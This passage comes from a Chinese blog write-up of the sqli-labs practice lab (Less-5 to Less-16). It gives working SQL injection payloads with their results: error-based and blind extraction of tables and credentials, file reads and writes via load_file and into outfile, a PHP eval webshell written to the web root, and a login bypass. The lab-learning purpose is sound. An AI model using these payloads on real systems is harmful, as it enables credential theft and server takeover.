<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' union select count(*) ,1, concat((select database()), floor(rand()*2))as a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure>

<p>得到<code>Duplicate entry &#39;security1&#39; for key &#39;group_key&#39;</code>     </p>
</li>
<li><p>查表</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' union select count(*) ,1, concat((select table_name from information_schema.tables where table_schema='security' limit 3,1), floor(rand()*2))as a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure>

<p>得到<code>Duplicate entry &#39;users0&#39; for key &#39;group_key&#39;</code> </p>
</li>
<li><p>查列</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' union select count(*) ,1, concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1), floor(rand()*2))as a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure>

<p>得到<code>Duplicate entry &#39;password0&#39; for key &#39;group_key&#39;</code> </p>
</li>
<li><p>查值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' union select count(*) ,1, concat((select concat(username,' ',password) from users limit 0,1), floor(rand()*2))as a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure>

<p>得到<code>Duplicate entry &#39;Dumb Dumb0&#39; for key &#39;group_key&#39;</code>   </p>
</li>
</ol>
<h3 id="Less-8-Less-10"><a href="#Less-8-Less-10" class="headerlink" title="Less-8-Less-10"></a>Less-8-Less-10</h3><p>总体来说和Less-5一样，唯一不同的是Less8里将mysql 报错的语句进行了注释，那么这一关报错注入就不行了。</p>
<p><img src="/img/sql_9.png" alt=""></p>
<p>9和10也都和5一样，目的是让大家了解基于sleep的注入，这里不多阐述</p>
<h2 id="数据库文件的基本操作"><a href="#数据库文件的基本操作" class="headerlink" title="数据库文件的基本操作"></a>数据库文件的基本操作</h2><h4 id="Load-file-读文件"><a href="#Load-file-读文件" class="headerlink" title="Load_file()读文件"></a>Load_file()读文件</h4><h4 id="load-file-file-name-读取文件并返回该文件的内容作为一个字符串"><a href="#load-file-file-name-读取文件并返回该文件的内容作为一个字符串" class="headerlink" title="load_file(file_name):读取文件并返回该文件的内容作为一个字符串"></a>load_file(file_name):读取文件并返回该文件的内容作为一个字符串</h4><p>使用条件：</p>
<ul>
<li><p>必须有权限读取并且文件必须完全可读</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0  </span><br><span class="line">&#x2F;*如果结果返回正常，说明具有读写权限</span><br><span class="line">&#x2F;*返回错误，应该还是管理员给数据库账号降权</span><br></pre></td></tr></table></figure>
</li>
<li><p>欲读取的文件必须在服务器上</p>
</li>
<li><p>必须指定文件的完整路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">两个函数@@datadir 读取数据库路径 @@basedir MYSQL 获取安装路径</span><br></pre></td></tr></table></figure>
</li>
<li><p>欲读取的文件必须小于max_allowed_packet</p>
</li>
</ul>
<p>难点：</p>
<ul>
<li>绝对路径不好获取</li>
<li>构造有效的语句（报错出绝对路径）<br>当提交一个错误的query，如果display_error=on，程序会暴露web目录的绝对路径。</li>
</ul>
<h4 id="into-outfile写文件"><a href="#into-outfile写文件" class="headerlink" title="into outfile写文件"></a>into outfile写文件</h4><p>使用条件：</p>
<ul>
<li><p>写入的文件夹必须有写入权限</p>
</li>
<li><p>文件路径必须转译</p>
</li>
<li><p>mysql配置中my.ini下(若没有以下代码直接添加即可)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secure-auth&#x3D;1</span><br><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="/img/sql_10.png" alt=""></p>
</li>
</ul>
<h3 id="Less-7-Dump-into-outfile"><a href="#Less-7-Dump-into-outfile" class="headerlink" title="Less-7 Dump into outfile"></a>Less-7 Dump into outfile</h3><p>这题提示<code>dump into outfile</code>和<code>You are in.... Use outfile......</code> ，所以我们可以试着用文件导入来注入。 </p>
<p>id的处理为<code>((&#39;id&#39;))</code>，所以我们可以构造<code>1&#39;)) %23</code>进行注入 </p>
<ul>
<li><p>盲注方法同less-5类似</p>
</li>
<li><p>写入查询文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;-1&#39;)) union select 1,2,(select group_concat(username) from users) into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\test.txt&quot; %23</span><br></pre></td></tr></table></figure>

<p>回显<code>You have an error in your SQL syntax</code> 但是我们可以去文件夹看到已经创建了test.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1	2	Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入phpinfo</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-7/?id=-1%27))%20union%20select%201,2,%27%3C?php%20phpinfo();?%3E%27%20into%20outfile%20%22C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\mm1.php%22%20%23</span><br></pre></td></tr></table></figure>

<p><img src="/img/sql_11.png" alt=""></p>
</li>
<li><p>写入webshell</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-7/?id=-1')) union select 1,2,'<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"c"</span>]);<span class="meta">?&gt;</span></span>' into outfile "C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\mm.php" %23</span><br></pre></td></tr></table></figure>

<p><img src="/img/sql_12.png" alt=""></p>
<p>结论</p>
<p>文件写入条件较为苛刻，环境配置那儿卡了很久，但是在ctf中还是很实用的~</p>
</li>
</ul>
<h2 id="POST类型的sql注入"><a href="#POST类型的sql注入" class="headerlink" title="POST类型的sql注入"></a>POST类型的sql注入</h2><p>让我们来熟悉一下一次POST请求和数据库交互的过程吧。 </p>
<ol>
<li><p>提交正常的<code>username</code>和<code>password</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39; and password&#x3D;&#39;123&#39; LIMIT 0,1</span><br><span class="line">无回显</span><br></pre></td></tr></table></figure>
</li>
<li><p>提交不正常的<code>username</code>和<code>password</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;#&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;123&#39; LIMIT 0,1</span><br><span class="line">回显</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:admin</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>可以看到第二种情况中，<code>#</code>将后面的语句注释掉了，所以只要我们输入的用户名为<code>admin</code>时，就能够成功登陆； </p>
<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;123&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>可知这里对参数做了单引号的处理 </p>
<p>根据前面的知识构造<code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;or 1&#x3D;1#&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:admin</span><br><span class="line">成功登陆</span><br></pre></td></tr></table></figure>

<ol>
<li><p>查询字段数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; order by 2 #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit  &#x2F;&#x2F;返回正常</span><br><span class="line">uname&#x3D;admin&#39; order by 3 #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit  &#x2F;&#x2F;返回不正常</span><br></pre></td></tr></table></figure>
</li>
<li><p>查当前数据库 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39; union select 1,database() #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">返回  Your Login name:1</span><br><span class="line">	 Your Password:security</span><br></pre></td></tr></table></figure>
</li>
<li><p>查表 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema like &#39;security&#39; #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">返回 		Your Login name:1</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p>查列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">返回  	Your Login name:1</span><br><span class="line">Your Password:id,username,password,id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p>查内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39; union select 1,group_concat(username,&#39; &#39;,password) from users #&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br><span class="line">返回			Your Login name:1</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword....</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit  无回显</span><br><span class="line">uname&#x3D;admin&quot;&amp;passwd&#x3D;123&amp;submit&#x3D;Submit  回显···syntax to use near &#39;123&quot;)··</span><br></pre></td></tr></table></figure>

<p>可知这里对参数做了双引号和括号的处理 </p>
<p>于是构造 <code>uname=123&quot;)</code>即可  其他步骤和11一样</p>
<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39; &amp;passwd&#x3D;123&amp;submit&#x3D;Submit  回显 ··· syntax to use near &#39;123&#39;)···</span><br></pre></td></tr></table></figure>

<p>可知这里对参数做了单引号和括号的处理 </p>
<p>于是构造 <code>uname=123&#39;)</code>即可</p>
<p>但是这里没有数据回显，只有登录成功和不成功</p>
<p>因此可以用盲注来进行下一步的操作</p>
<p>这里有一个点就是你要确保前面输入的用户名一点是错误的 然后利用or使or后面成为主要的判定条件，则可以和<code>less5</code>一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;123&#39;) or ascii(substr((select database()),1,1))&gt;114  # &amp;passwd&#x3D;123&amp;submit&#x3D;Submit  &#x2F;&#x2F;success</span><br><span class="line">uname&#x3D;123&#39;) or ascii(substr((select database()),1,1))&gt;115  # &amp;passwd&#x3D;123&amp;submit&#x3D;Submit  &#x2F;&#x2F;faild</span><br></pre></td></tr></table></figure>

<p>那么数据库的第一个字段的<code>ascii</code>码为<code>115</code>即 <code>s</code></p>
<p>后面的步骤和<code>less5</code>一样</p>
<h3 id="less-14-less16"><a href="#less-14-less16" class="headerlink" title="less-14-less16"></a>less-14-less16</h3><p>基本和前面类似 只是对<code>uname</code>的</p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avater.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>comical</div>
      <div>2018-07-13</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/labs/">labs</a>

      <a class="tag-link" href="/tags/sql-labs/" rel="tag">#sql-labs</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
